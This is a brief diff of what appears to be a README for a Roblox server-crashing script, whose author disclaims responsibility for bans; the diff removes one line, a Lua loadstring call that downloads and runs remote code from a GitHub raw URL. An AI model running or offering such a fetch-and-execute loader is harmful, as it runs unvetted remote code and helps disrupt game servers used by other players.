@@ -26,5 +26,3 @@ I don't care if you get banned or something
 If it doesn't work in your game, it's not my problem.
 
 #
-
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/trxsh-root/roblox-server-crasher/main/loader.lua"),true))()
